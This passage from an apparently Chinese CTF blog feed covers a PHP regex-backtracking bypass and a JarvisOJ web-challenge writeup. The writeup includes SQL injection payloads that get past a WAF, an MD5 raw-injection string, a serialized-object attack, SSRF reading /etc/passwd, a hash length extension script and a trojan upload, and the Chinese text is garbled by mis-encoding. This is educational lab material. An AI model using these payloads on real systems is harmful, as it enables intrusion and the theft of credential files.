<code>.*</code>ä¼šå°†åé¢çš„å…¨éƒ¨å­—ç¬¦åŒ¹é…åˆ°ï¼Œç„¶åä¸ºäº†åŒ¹é…<code>[(`;?&gt;]</code><br>ç„¶åå°±ä¼šä¸€ä¸ªå­—ç¬¦ä¸€ä¸ªå­—ç¬¦çš„å›æº¯ï¼Œç›´åˆ°åŒ¹é…åˆ°æœ€åçš„; ï¼Œæ‰ä¼šè¿›è¡Œä¸‹ä¸€ä¸ª<code>.*</code>çš„åŒ¹é…</p><p>PHPä¸ºäº†é˜²æ­¢æ­£åˆ™è¡¨è¾¾å¼çš„æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆå›æº¯æ¬¡æ•°è¿‡å¤šï¼‰ï¼Œé™åˆ¶äº†å›æº¯çš„æ¬¡æ•°</p><p>åœ¨php5.2åŠä¹‹å‰è¿™ä¸ªæ¬¡æ•°ä¸º100000ï¼Œä¹‹åä¸€ç›´åˆ°å¦‚ä»Šçš„7.2éƒ½æ˜¯1000000<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1qhc3t99zj30tz09u3zu.jpg" alt=""><br>é‚£ä¹ˆå¦‚æœè¶…è¿‡100ä¸‡æ¬¡ä¼šè¿”å›å¤±è´¥  å³åŒ¹é…å¤±è´¥<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(<span class="name">preg_match</span>('/&lt;\?.*[(`;?&gt;].*/is', '&lt;?php phpinfo()<span class="comment">;//'.str_repeat('a', 1000000)));</span></span><br><span class="line">bool(<span class="name">false</span>)</span><br></pre></td></tr></table></figure></p><h1 id="phpmagic"><a href="#phpmagic" class="headerlink" title="phpmagic"></a>phpmagic</h1><p>ç«¯å£:82</p><h1 id="phplimit"><a href="#phplimit" class="headerlink" title="phplimit"></a>phplimit</h1><p>ç«¯å£:8084<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span></span><br><span class="line"><span class="php">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p><p>ä»£ç ä¼šå°†<code>$_GET[&#39;code&#39;]</code>ä¸­æ»¡è¶³æ­£åˆ™<code>/[^\W]+\((?R)?\)/</code>çš„éƒ¨åˆ†ï¼Œæ›¿æ¢ä¸ºç©ºï¼Œç„¶åæŸ¥çœ‹æ˜¯å¦å‰©ä¸‹çš„éƒ¨åˆ†å¼ºç­‰äº;<br>å¦‚æœæ»¡è¶³ï¼Œåˆ™æ‰§è¡Œ<br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>($_GET[<span class="string">'code'</span>])<span class="comment">;</span></span><br></pre></td></tr></table></figure></p><p>å¦åˆ™ä»€ä¹ˆéƒ½ä¸åšã€‚<br>é¦–å…ˆæ˜¯[^\W]<br>å¯¹äº\W,å…¶æ„æ€ç­‰ä»·äº[^A-Za-z0-9_]ã€‚<br>é‚£ä¹ˆæˆ‘ä»¬çŸ¥é“ï¼Œæˆ‘ä»¬çš„inputå¿…é¡»ä»¥æ­¤å¼€å¤´<br>ç„¶åæ˜¯æ‹¬å·åŒ¹é…</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\( ...... \)</span><br></pre></td></tr></table></figure><p>æ‹¬å·ä¸­é—´ä¸º<br>(?R)?<br>æ„æ€ä¸ºé‡å¤æ•´ä¸ªæ¨¡å¼<br>ç®€å•ç†è§£ï¼Œæˆ‘ä»¬å¯ä»¥è¾“å…¥ä»¥ä¸‹ç±»å‹</p><p>a(b(c()))<br>ä½†æˆ‘ä»¬ä¸èƒ½åŠ å‚æ•°,å¦åˆ™å°†æ— æ³•åŒ¹é…</p><p>a(c,d)<br>æ‰€ä»¥æ­£åˆ™çœ‹å®Œï¼Œé¢˜ç›®çš„æ„æ€éå¸¸æ˜ç¡®äº†ï¼š<br>æˆ‘ä»¬åªèƒ½inputå‡½æ•°ï¼Œä½†å‡½æ•°ä¸­ä¸èƒ½ä½¿ç”¨å‚æ•°ï¼Œå¦åˆ™åˆ¤æ–­å¥å³è¾¹ç»è¿‡æ›¿æ¢ï¼Œå°†ä¸æ­¢å‰©ä½™åˆ†å·;</p><p>é‚£ä¹ˆæœ‰æ²¡æœ‰åŠæ³•é€šè¿‡æ— å‚æ•°å‡½æ•°ï¼Œè¾¾åˆ°RCEçš„ç›®çš„å‘¢ï¼Ÿç­”æ¡ˆæ˜¾ç„¶æ˜¯ä¸å¯èƒ½çš„ï¼Œæ²¡æœ‰å‚æ•°ï¼Œæ€ä¹ˆä¼ é€’æˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„æŒ‡ä»¤å‘¢ï¼Ÿ</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>JarvisOj-Writeup</title>
      <link href="/2019/03/24/JarvisOj-Writeup/"/>
      <url>/2019/03/24/JarvisOj-Writeup/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g22a8pyxgzj30cx0g73zq.jpg" alt=""><br><a href="https://ws1.sinaimg.cn/large/005RaR9Jgy1g22a90m46bj30hs0mlgm8.jpg" target="_blank" rel="noopener">https://ws1.sinaimg.cn/large/005RaR9Jgy1g22a90m46bj30hs0mlgm8.jpg</a></p><h1 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bubaauujj30i704j0so.jpg" alt=""><br>å•çº¯çš„æˆ‘è¾“å…¥ï¼š<a href="http://web.jarvisoj.com:51" target="_blank" rel="noopener">http://web.jarvisoj.com:51</a><br>å‘ç°ä¸æ˜¯,å¦‚æœä¸æ˜¯ç›®çš„ç«¯å£,é‚£å°±æ˜¯æºç«¯å£äº†<br>æºç«¯å£å°±æ˜¯æŒ‡æœ¬åœ°ç«¯å£<br>ç›®çš„ç«¯å£å°±æ˜¯è¿œç¨‹ç«¯å£<br>å¾ˆå¤šäººéƒ½åœ¨æºç«¯å£å’Œç›®çš„ç«¯å£è¿™ä¸¤ä¸ªæ¦‚å¿µä¸ŠçŠ¯è¿·ç³Šï¼Œ<br>å…¶å®ä»–ä»¬åªæ˜¯æ•°æ®çš„å‘é€æ–¹å‘çš„é—®é¢˜ã€‚<br>æ¯”å¦‚å¾ˆå¤šé˜²ç«å¢™çš„è§„åˆ™è®¾ç½®éƒ½è¦æ±‚è®¾ç½®æºç«¯å£å’Œç›®çš„ç«¯å£ï¼Œ<br>å…¶å®å°±æ˜¯æ•°æ®åŒ…é€šè¿‡é˜²ç«å¢™çš„æ–¹å‘æ˜¯å‘å†…è¿˜æ˜¯å‘å¤–ã€‚<br><strong>æºç«¯å£å°±æ˜¯æœ¬æœºç¨‹åºç”¨æ¥å‘é€æ•°æ®çš„ç«¯å£ï¼Œç›®çš„ç«¯å£å°±æ˜¯å¯¹æ–¹ä¸»æœºç”¨å“ªä¸ªç«¯å£æ¥æ”¶</strong></p><p>åˆ©ç”¨curl å‘½ä»¤<br>curl â€“local-port 51 <a href="http://web.jarvisoj.com:32770/" target="_blank" rel="noopener">http://web.jarvisoj.com:32770/</a><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bv3dnzd1j30j308ajtu.jpg" alt=""></p><h1 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bv6laii0j30fd039q2t.jpg" alt=""><br>ç›´æ¥æ„é€ X-Forwarded-For:127.0.0.1å‘åŒ…<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bv75a1hij30m207wjup.jpg" alt=""></p><h1 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bv7wk5a2j30d503f74d.jpg" alt=""><br>åœ¨headeré‡Œæœ‰æç¤º<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bvagk7ndj30jn05aabg.jpg" alt=""><br>è¿™æ˜¯å› <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">md5()å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯è¦åŠ å¯†çš„å­—ç¬¦ä¸²ï¼Œå¦ä¸€ä¸ªæ˜¯è¾“å‡ºæ ¼å¼</span><br><span class="line">![](https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bvgi6fn5j30p109kwet.jpg)</span><br><span class="line">é»˜è®¤ä¸ºfalse</span><br><span class="line">![](https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bvnplslfj30sd05it98.jpg)</span><br><span class="line">å½“åŠ ä¸Štrueæ—¶</span><br><span class="line">![](https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bvsj88x1j30rj06zaaq.jpg)</span><br><span class="line">select * from `admin` where password=&apos;&quot;.md5($pass,true).&quot;&apos;</span><br><span class="line">![](https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bvz1j8ymj310c06qwfk.jpg)</span><br><span class="line">æ‹¼æ¥ä¹‹åå°±å˜æˆäº†</span><br><span class="line">SELECT * FROM admin WHERE pass = &apos;&apos;or&apos;6&lt;trash&gt;&apos;</span><br><span class="line">æäº¤ ffifdyop å³å¯</span><br><span class="line"></span><br><span class="line"># ç¥ç›¾å±€çš„ç§˜å¯†</span><br><span class="line">æŸ¥çœ‹æºç ï¼Œå‘ç°imgå€¼è¢«base64 å°è¯•è¯»å–showimg.php</span><br><span class="line">![](https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bw339cgfj30ek02v74e.jpg)</span><br><span class="line">view-source:http://web.jarvisoj.com:32768/showimg.php?img=c2hvd2ltZy5waHA=</span><br><span class="line">![](https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bw4ssxmkj30nz055wei.jpg)</span><br><span class="line">è¿™æ˜¯ç”¨æ¥è¿‡æ»¤çš„,å†çœ‹Index.php</span><br><span class="line">![](https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bw74j261j30gg05jjrd.jpg)</span><br><span class="line">å¯èƒ½æ¶‰åŠåˆ°ååºåˆ—åŒ–ï¼Œæ¥ç€è¯»å–shield.php</span><br><span class="line">![](https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bw98tow9j30lx07aq33.jpg)</span><br><span class="line">æ„é€ åºåˆ—åŒ–</span><br></pre></td></tr></table></figure></p><p>&lt;?php<br>    //flag is in pctf.php<br>    class Shield {<br>        public $file;<br>        function __construct($filename = â€˜â€™) {<br>            $this -&gt; file = $filename;<br>        }</p><pre><code>    function readfile() {        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE          &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) {            return @file_get_contents($this-&gt;file);        }    }}$x = new Shield(&apos;pctf.php&apos;);echo serialize($x);</code></pre><p>?&gt;</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">6</span>:<span class="string">"Shield"</span>:<span class="number">1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"file"</span>;<span class="attribute">s</span>:<span class="number">8</span>:<span class="string">"pctf.php"</span>;&#125;</span><br><span class="line">!<span class="selector-attr">[]</span>(<span class="attribute">https</span>:<span class="comment">//ws1.sinaimg.cn/large/005RaR9Jgy1g1bwfup2wnj30rk06h3z0.jpg)</span></span><br><span class="line"></span><br><span class="line"># IN A Mess</span><br><span class="line"></span><br><span class="line">![](<span class="attribute">https</span>:<span class="comment">//ws1.sinaimg.cn/large/005RaR9Jgy1g1bwi4jn68j30et044glt.jpg)</span></span><br><span class="line">çœ‹åˆ°ä¸ªIDå‚æ•°ï¼Œæœ¬èƒ½çš„å°è¯•sqlæ³¨å…¥æµ‹è¯•</span><br><span class="line">æŸ¥çœ‹æºç </span><br><span class="line">![](<span class="attribute">https</span>:<span class="comment">//ws1.sinaimg.cn/large/005RaR9Jgy1g1bwmsk9v1j30h0032q33.jpg)</span></span><br><span class="line">è®¿é—®index.phps,æ˜¯ä¸€é“ä»£ç å®¡è®¡</span><br><span class="line">![](<span class="attribute">https</span>:<span class="comment">//ws1.sinaimg.cn/large/005RaR9Jgy1g1bwnf2m4jj30t70d3t99.jpg)</span></span><br><span class="line"></span><br><span class="line">idï¼šid==<span class="number">0</span>å…¸å‹çš„PHPå¼±æ¯”è¾ƒï¼Œåˆ©ç”¨id=<span class="number">0</span>aæˆ–id=<span class="number">0</span>e123æˆ–id=asdå‡å¯å®ç°ç»•è¿‡</span><br><span class="line"></span><br><span class="line">bï¼šstrlen($b)&gt;<span class="number">5</span> and eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) and substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>) è¿™é‡Œè¦æ±‚ï¼šbçš„é•¿åº¦å¤§äº<span class="number">5</span>ï¼Œä¸”æ˜¯åŸºäºeregiå‡½æ•°çš„å¼±ç±»å‹ï¼Œç”¨%<span class="number">00</span>çš„ç»•è¿‡ï¼ˆ strlenå‡½æ•°å¯¹%<span class="number">00</span>ä¸æˆªæ–­ä½†substræˆªæ–­ï¼‰é‚£ä¹ˆå¯ä»¥ä»¤b=%<span class="number">00411111</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">data</span>: ç”¨<span class="attribute">php</span>:<span class="comment">//input,data åè®®</span></span><br><span class="line">?id=<span class="number">0</span>e&amp;a=<span class="attribute">data</span>:,<span class="number">1112%</span><span class="number">20</span>is%<span class="number">20</span>a%<span class="number">20</span>nice%<span class="number">20</span>lab!&amp;b=%<span class="number">00411111</span></span><br><span class="line">![](<span class="attribute">https</span>:<span class="comment">//ws1.sinaimg.cn/large/005RaR9Jgy1g1bxndjerhj30cn03vq2q.jpg)</span></span><br><span class="line">å‘ç°ä¸æ˜¯flag äºæ˜¯è®¿é—®ä¸€ä¸‹</span><br><span class="line">![](<span class="attribute">https</span>:<span class="comment">//ws1.sinaimg.cn/large/005RaR9Jgy1g1bxqnf23ij30c5023t8h.jpg)</span></span><br><span class="line">è¿›è¡Œsqlæ³¨å…¥æµ‹è¯•  </span><br><span class="line">å‘ç°è¿‡æ»¤ç©ºæ ¼</span><br><span class="line">![](<span class="attribute">https</span>:<span class="comment">//ws1.sinaimg.cn/large/005RaR9Jgy1g1bxrl2a57j305n0150np.jpg)</span></span><br><span class="line">ç”¨<span class="built_in">``</span><span class="built_in">` /*1*/ `</span><span class="built_in">``</span>è¿›è¡Œç»•è¿‡</span><br><span class="line">![](<span class="attribute">https</span>:<span class="comment">//ws1.sinaimg.cn/large/005RaR9Jgy1g1bxtnvrsuj30c3021we9.jpg)</span></span><br><span class="line">çŒœè§£å­—æ®µ</span><br></pre></td></tr></table></figure><p>id=1/<em>1</em>/order/<em>1</em>/by/<em>1</em>/3<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å‘ç°<span class="class"><span class="keyword">union</span> <span class="title">select</span> ç­‰å…³é”®è¯ä¹Ÿè¢«<span class="title">waf</span>ï¼Œç”¨åŒå†™è¿›è¡Œç»•è¿‡</span></span><br></pre></td></tr></table></figure></p><p>/index.php?id=-1/<em>1</em>/ununionion/<em>1</em>/sselectelect/<em>1</em>/1,2,3<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!<span class="selector-attr">[]</span>(<span class="attribute">https</span>:<span class="comment">//ws1.sinaimg.cn/large/005RaR9Jgy1g1by4543n9j30400100cb.jpg)</span></span><br><span class="line">æ¥ä¸‹æ¥è¿›è¡Œå¸¸è§„æ³¨å…¥</span><br></pre></td></tr></table></figure></p><p>id=-1/<em>1</em>/ununionion/<em>1</em>/selselectect/<em>1</em>/1,2,database()#<br>index.php?id=-1/<em>1</em>/ununionion/<em>1</em>/selselectect/<em>1</em>/1,2,group_concat(id,context,title)/<em>1</em>/frfromom/<em>1</em>/content#<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">![](<span class="symbol">https:</span>/<span class="regexp">/ws1.sinaimg.cn/large</span><span class="regexp">/005RaR9Jgy1g1by6jgs7sj30co01rgle.jpg)</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp"># RE?</span></span><br><span class="line"><span class="regexp">ä¸‹è½½ä¸‹æ¥åæ–‡ä»¶åä¸ºudf.so.XXXXXï¼Œç”¨mysqlå¯¼å…¥ä¸€ä¸‹ã€‚å…·ä½“è¿‡ç¨‹å¦‚ä¸‹ã€‚</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">å°†udfæ–‡ä»¶æ”¾åˆ°/usr</span><span class="regexp">/lib/mysql</span><span class="regexp">/plugin/</span>æ–‡ä»¶å¤¹ä¸­ï¼š</span><br><span class="line"></span><br><span class="line">/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">mysql</span>/<span class="title">plugin</span><span class="comment"># wget https://dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172</span></span></span><br><span class="line"></span><br><span class="line">ç™»é™†mysqlåï¼ŒåŠ è½½help_meå‡½æ•°ï¼š</span><br></pre></td></tr></table></figure></p><p>mysql&gt; create function help_me returns string soname â€˜udf.so.02f8981200697e5eeb661e64797fc172â€™;<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">åˆ©ç”¨<span class="selector-tag">help_me</span>å‡½æ•°ï¼š</span><br><span class="line">!<span class="selector-attr">[]</span>(<span class="attribute">https</span>:<span class="comment">//ws1.sinaimg.cn/large/005RaR9Jgy1g1byabzqy7j30ii046dfu.jpg)</span></span><br><span class="line">åˆ©ç”¨udfå†åˆ›å»ºä¸€ä¸ªgetflagå‡½æ•°ã€‚</span><br></pre></td></tr></table></figure></p><p>mysql&gt; create function getflag returns string soname â€˜udf.so.02f8981200697e5eeb661e64797fc172â€™;<br>Query OK, 0 rows affected (0.05 sec)<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">å¾—åˆ°flagï¼š</span><br><span class="line"></span><br><span class="line">![](https:<span class="regexp">//</span>ws1.sinaimg.cn<span class="regexp">/large/</span><span class="number">005</span>RaR9Jgy1g1bybfs4qmj30iy05974b.jpg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ</span></span><br><span class="line"></span><br><span class="line">![](https:<span class="regexp">//</span>ws1.sinaimg.cn<span class="regexp">/large/</span><span class="number">005</span>RaR9Jgy1g1bye1p1t1j30jn04kq2v.jpg)</span><br><span class="line">åœ¨httpå¤´å‘ç°cookieå¤´çš„hash ä¼°è®¡æ˜¯å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»</span><br><span class="line">åˆ©ç”¨å®‰è£…hash_extender è¿›è¡Œæ”»å‡»</span><br><span class="line">åœ¨linux</span><br></pre></td></tr></table></figure></p><p>git clone <a href="https://github.com/iagox86/hash_extender" target="_blank" rel="noopener">https://github.com/iagox86/hash_extender</a><br>cd hash_extender<br>make<br><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åœ¨hash_extenderç›®å½•ä¸‹æ–°å»º<span class="keyword">test</span>.pyæ–‡ä»¶</span><br></pre></td></tr></table></figure></p><h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding:utf-8 --"></a>-<em>- coding:utf-8 -</em>-</h1><p>from urlparse import urlparse<br>from httplib import HTTPConnection<br>from urllib import urlencode<br>import json<br>import time<br>import os<br>import urllib<br>def gao(x, y):</p><pre><code>    #print x    #print yurl = &quot;http://web.jarvisoj.com:32778/index.php&quot;cookie = &quot;role=&quot; + x + &quot;; hsh=&quot; + y    #print cookiebuild_header = {        &apos;Cookie&apos;: cookie,        &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0&apos;,        &apos;Host&apos;: &apos;web.jarvisoj.com:32778&apos;,        &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;,}urlparts = urlparse(url)conn = HTTPConnection(urlparts.hostname, urlparts.port or 80)conn.request(&quot;GET&quot;, urlparts.path, &apos;&apos;, build_header)resp = conn.getresponse()body = resp.read()return body</code></pre><p>for i in xrange(1000):<br>    print i</p><pre><code># secret len = ???find_hash = &quot;./hash_extender -d &apos;;\&quot;tseug\&quot;:5:s&apos; -s 3a4727d57463f122833d9e732f94e4e0 -f md5  -a &apos;;\&quot;nimda\&quot;:5:s&apos; --out-data-format=html -l &quot; + str(i) + &quot; --quiet&quot;#print find_hashcalc_res = os.popen(find_hash).readlines()hash_value = calc_res[0][:32]attack_padding = calc_res[0][32:]attack_padding = urllib.quote(urllib.unquote(attack_padding)[::-1])ret = gao(attack_padding, hash_value)if &quot;Welcome&quot; in ret:    print ret    break</code></pre><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç„¶ååœ¨è¯¥ç›®å½•è¾“å…¥ ```python test.py</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dqxtm02cj30mh0dmq3e.jpg" alt=""></p><h1 id="Chopper"><a href="#Chopper" class="headerlink" title="Chopper"></a>Chopper</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1c024jsz9j30ng0ef41b.jpg" alt=""><br>ç‚¹å‡»ç®¡ç†å‘˜ç™»å…¥<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1c04tqt35j30db045a9z.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1c09w1o4gj30mw07t3yz.jpg" alt=""><br>æŸ¥çœ‹æºç <br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1c05ppk0jj30n208hgm8.jpg" alt=""><br>å‘ç°urlå‚æ•°å¯æ§<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1duusczvdj310y0c4myr.jpg" alt=""><br>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åŸºæœ¬åˆ¤æ–­ï¼Œè¿™é‡Œæ˜¯å­˜åœ¨SSRFçš„<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32782</span><span class="regexp">/proxy.php?url=file:/</span><span class="regexp">//</span>etc<span class="regexp">/passwd</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dv352reaj30ck0450sj.jpg" alt=""><br>å‘ç°è¢«è¿‡æ»¤äº†<br>è¿›è¡Œå¤§å†™è½¬æ¢<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32782</span><span class="regexp">/proxy.php?url=File:/</span><span class="regexp">//</span>etc<span class="regexp">/passwd</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dv4d2g8sj311y07k404.jpg" alt=""><br>æ¥ä¸‹æ¥è¿›ç¨‹ç«™ç‚¹ç›®å½•æŒ–æ˜<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dv6esfunj30pj064t8z.jpg" alt=""><br>å½“ä¸ç»™url å‚æ•°å€¼æ—¶ å°±ä¼šæŠ¥é”™<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32782</span><span class="regexp">/proxy.php?url=File:/</span><span class="regexp">//</span>opt<span class="regexp">/lampp/</span>htdocs<span class="regexp">/proxy.php</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dv85qcmnj30vr0ip0ub.jpg" alt=""><br>æ¥ä¸‹æ¥è¯»å–adminç›®å½•<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32782</span><span class="regexp">/proxy.php?url=File:/</span><span class="regexp">//</span>opt<span class="regexp">/lampp/</span>htdocs<span class="regexp">/admin/i</span>ndex.html</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dvbfqkbhj30pl08ot96.jpg" alt=""><br>å¯¹adminç›®å½•è¿›è¡Œçˆ†ç ´<br>å‘ç°robots.txt<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dvd32k7hj30s305w3yv.jpg" alt=""><br>è®¿é—®trojan.php,å¾—åˆ°flag<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dvg66cr2j310k074aat.jpg" alt=""></p><h1 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h1><p>æ‰“å¼€æ˜¯è¿™ä¹ˆä¸€ä¸ªé¡µé¢<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dta9cg6bj30yl0fygo1.jpg" alt=""></p><p>å°è¯•å…ˆä¸Šä¼ ä¸€ä¸ªæ­£å¸¸çš„jpgæ–‡ä»¶,ç„¶ååœ¨viewä¸­æŸ¥çœ‹<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1dthupb8tj30qz0i2dtc.jpg" alt=""></p><p>å³å‡»å¤åˆ¶å›¾ç‰‡é“¾æ¥åœ°å€,å¾—åˆ°å›¾ç‰‡åœ°å€<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32785</span><span class="regexp">/uploads/</span><span class="number">1553405018</span>.jpg</span><br></pre></td></tr></table></figure></p><p>ä¸Šä¼ æœ¨é©¬å›¾ç‰‡,ç”¨èœåˆ€è¿æ¥,è¿æ¥å¤±è´¥<br>è§‚å¯Ÿè¿™ä¸¤ä¸ªé“¾æ¥<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.<span class="keyword">com</span>:<span class="number">32785</span>/<span class="built_in">index</span>.php?page=submit</span><br><span class="line">http://web.jarvisoj.<span class="keyword">com</span>:<span class="number">32785</span>/<span class="built_in">index</span>.php?page=<span class="keyword">view</span></span><br></pre></td></tr></table></figure></p><p>åŠ ä¸Šå•å¼•å·è¯•è¯•<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 